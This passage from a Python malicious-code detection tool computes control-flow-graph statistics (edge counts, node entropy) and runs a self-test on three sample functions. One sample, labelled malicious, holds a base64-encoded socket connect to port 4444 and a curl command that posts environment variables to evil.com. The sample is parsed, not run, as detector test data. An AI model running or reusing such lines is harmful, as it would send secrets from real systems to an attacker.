        "CFG_EXCEPTION":   0,
        "DATA_DEF_USE":    0,
        "AST_CHILD":       0,
    }
    _edge_labels = list(edge_type_counts.keys())
    for e in edges:
        if 0 <= e.edge_type < len(_edge_labels):
            edge_type_counts[_edge_labels[e.edge_type]] += 1

    node_type_counts: dict[str, int] = defaultdict(int)
    for nd in nodes:
        node_type_counts[nd.sem_type] += 1

    max_entropy = max((nd.entropy for nd in nodes), default=0.0)
    high_entropy_nodes = [nd for nd in nodes if nd.entropy > 6.5]

    return {
        "num_nodes":          len(nodes),
        "num_edges":          len(edges),
        "edge_type_counts":   dict(edge_type_counts),
        "node_type_counts":   dict(node_type_counts),
        "max_entropy":        round(max_entropy, 4),
        "high_entropy_nodes": len(high_entropy_nodes),   # strong obfuscation signal
        "avg_depth":          round(
            sum(nd.depth for nd in nodes) / max(len(nodes), 1), 2
        ),
    }


# ============================================================================
# I.  Self-test (run as script for quick sanity check)
# ============================================================================

if __name__ == "__main__":
    _TEST_CLEAN = """
def compute_fibonacci(n):
    a, b = 0, 1
    result = []
    for i in range(n):
        result.append(a)
        a, b = b, a + b
    return result
"""

    _TEST_MALICIOUS = """
def exfiltrate_env():
    import os
    import base64
    import subprocess
    payload = base64.b64decode(
        "aW1wb3J0IHNvY2tldDtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCIxMC4wLjAuMSIsNDQ0NCkp"
    )
    env_data = str(os.environ)
    try:
        subprocess.Popen(["curl", "-d", env_data, "http://evil.com/collect"])
    except Exception:
        pass
"""

    _TEST_BRANCHING = """
def classify_risk(score, threshold, fallback=False):
    if score > threshold:
        verdict = "HIGH"
        if score > threshold * 2:
            verdict = "CRITICAL"
    elif score == threshold:
        verdict = "MEDIUM"
    else:
        verdict = "LOW" if not fallback else "UNKNOWN"
    return verdict
"""

    print("=" * 60)
    print("CFG Extractor — Phase 1 Self-Test")
    print("=" * 60)

    for name, src, lbl in [
        ("CLEAN",     _TEST_CLEAN,      0),
        ("MALICIOUS", _TEST_MALICIOUS,  1),
        ("BRANCHING", _TEST_BRANCHING,  0),
    ]:
        extractor = CFGExtractor()
        tree = ast.parse(src)
        for node in tree.body:
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                ns, es = extractor.extract(node)
                stats  = graph_stats(ns, es)
                pyg    = graph_to_pyg(ns, es, label=lbl)

                print(f"\n[{name}]  function: {node.name}")
                print(f"  Nodes           : {stats['num_nodes']}")
                print(f"  Edges           : {stats['num_edges']}")
                print(f"  Edge breakdown  : {stats['edge_type_counts']}")
                print(f"  Max entropy     : {stats['max_entropy']:.4f} bits")
                print(f"  High-entropy Lx : {stats['high_entropy_nodes']} node(s) > 6.5 bits")
                print(f"  PyG x shape     : {pyg.x.shape}")
                print(f"  PyG edge_index  : {pyg.edge_index.shape}")
                print(f"  PyG edge_attr   : {pyg.edge_attr.shape}")
                print(f"  Label           : {pyg.y.item()}")
